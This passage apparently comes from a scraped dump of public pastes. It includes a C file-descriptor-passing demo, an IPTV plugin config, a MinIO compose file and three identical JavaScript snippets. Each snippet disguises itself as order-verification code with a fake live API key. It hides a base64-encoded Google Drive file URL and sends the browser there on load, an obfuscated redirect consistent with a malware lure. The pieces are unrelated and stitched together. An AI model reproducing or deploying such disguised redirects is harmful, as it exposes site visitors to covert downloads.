{
	struct msghdr msg = { 0 };
	struct cmsghdr *cmsg;
	int err;
	char iobuf;
	struct iovec io = {
		.iov_base = &iobuf,
		.iov_len = sizeof(iobuf),
	};
	union {
		char buf[CMSG_SPACE(sizeof(fd))];
		struct cmsghdr align;
	} u;

	msg.msg_iov = &io;
	msg.msg_iovlen = 1;
	msg.msg_control = u.buf;
	msg.msg_controllen = sizeof(u.buf);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));

	/* Send the file descriptor with an empty message
	 * containing only the ancillary data. */
	msg.msg_iov = NULL;
	msg.msg_iovlen = 0;

	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));

	err = sendmsg(sockfd, &msg, 0);
	if (err < 0)
		pexit(""sendmsg"");

	if (err != msg.msg_iovlen)
		pexit(""sendmsg"");

	return 0;
}

static int recvfd(int sockfd)
{
	struct msghdr msg = { 0 };
	struct cmsghdr *cmsg;
	int err;
	int fd;
	union {
		char buf[CMSG_SPACE(sizeof(fd))];
		struct cmsghdr align;
	} u;

	msg.msg_control = u.buf;
	msg.msg_controllen = sizeof(u.buf);

	err = recvmsg(sockfd, &msg, 0);
	if (err < 0)
		pexit(""recvmsg"");

	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg ||
		cmsg->cmsg_len != CMSG_LEN(sizeof(fd)) ||
		cmsg->cmsg_level != SOL_SOCKET ||
		cmsg->cmsg_type != SCM_RIGHTS)
		pexit(""Invalid cmsg"");

	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));

	return fd;
}

int main(void)
{
	int scm_fds[2], r;

	r = socketpair(AF_UNIX, SOCK_STREAM, 0, scm_fds);
	if (r < 0)
		pexit(""socketpair"");
	
	if (fork()) {
		int fd = open(""/"", O_PATH | O_DIRECTORY);

		if (fd < 0)
			pexit(""open"");

		r = sendfd(scm_fds[0], fd);
		if (r < 0)
			pexit(""sendfd"");

		puts(""sent fd"");

	} else {
		int fd = recvfd(scm_fds[1]);

		if (fd < 0)
			pexit(""recvfd"");

		puts(""received fd"");
		
		exit(0);
	}

	wait(NULL);
	puts(""done"");

	return 0;
}
"
QgvAxXdi,Market.js,dentira,JavaScript,Monday 31st of March 2025 11:42:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/343/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tC7M6LLL,config.xml,giannix,HTML,Monday 31st of March 2025 11:41:39 AM CDT,"<!--
  E2m3u2bouquet supplier config file
  Add as many suppliers as required
  this config file will be used and the relevant bouquets set up for all suppliers entered
  0 = No/False
  1 = Yes/True
  For elements with <![CDATA[]] enter value between empty brackets e.g. <![CDATA[mypassword]]>
-->
<config>
  <supplier>
    <name>privo</name><!-- Supplier Name -->
    <enabled>1</enabled><!-- Enable or disable the supplier (0 or 1) -->
    <settingslevel>expert</settingslevel>
    <m3uurl><![CDATA[http://suka.new2024.co:80/get.php?username=USERNAME&password=PASSWORD&type=m3u_plus&output=ts]]></m3uurl><!-- Extended M3U url --> 
    <epgurl><![CDATA[http://suka.new2024.co:80/xmltv.php?username=USERNAME&password=PASSWORD&next_days=7]]></epgurl><!-- XMLTV EPG url -->
    <username><![CDATA[uuuuu]]></username><!-- (Optional) will replace USERNAME placeholder in urls -->
    <password><![CDATA[ppppp]]></password><!-- (Optional) will replace PASSWORD placeh
    <providerupdate><![CDATA[]]></providerupdate><!-- (Optional) Provider update url -->
    <providerhideurls>0</providerhideurls><!-- (Optional) Hide Provider urls in plugin -->
    <iptvtypes>0</iptvtypes><!-- Change all TV streams to IPTV type (0 or 1) -->
    <streamtypetv>4097</streamtypetv><!-- (Optional) Custom TV stream type (e.g. 1, 4097, 5001 or 5002 -->
    <streamtypevod>4097</streamtypevod><!-- (Optional) Custom VOD stream type (e.g. 4097, 5001 or 5002 -->
    <multivod>1</multivod><!-- Split VOD into seperate categories (0 or 1) -->
    <allbouquet>0</allbouquet><!-- Create all channels bouquet (0 or 1) -->
    <picons>0</picons><!-- Automatically download Picons (0 or 1) -->
    <iconpath></iconpath><!-- Location to store picons) -->
    <xcludesref>0</xcludesref><!-- Disable service ref overriding from override.xml file (0 or 1) -->
    <bouqueturl><![CDATA[]]></bouqueturl><!-- (Optional) url to download providers bouquet - to map custom service references -->
    <bouquetdownload>1</bouquetdownload><!-- Download providers bouquet (uses default url) must have username and password set above - to map custom service references -->
    <bouquettop>0</bouquettop><!-- Place IPTV bouquets at top (0 or 1) -->
    <lastproviderupdate>0</lastproviderupdate><!-- Internal use -->
  </supplier>
</config>
"
3XcUFbNN,Untitled,dentira,JavaScript,Monday 31st of March 2025 11:26:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/575/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nAbYhx5b,MinIO Docker Compose,TheMRP,YAML,Monday 31st of March 2025 11:25:54 AM CDT,"services:
  minio:
    image: minio/minio
    container_name: minio
    restart: unless-stopped
    ports:
      - ""9000:9000""  # MinIO API Port
      - ""9090:9090""  # MinIO Console Port
    environment:
      MINIO_ROOT_USER: ""admin""
      MINIO_ROOT_PASSWORD: ""mysecretpassword""
    volumes:
      - <PATH_TO_DATA>:/data
    command: server --console-address "":9090"" /data"
a2Z7PYAA,Products.js,dentira,JavaScript,Monday 31st of March 2025 11:11:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
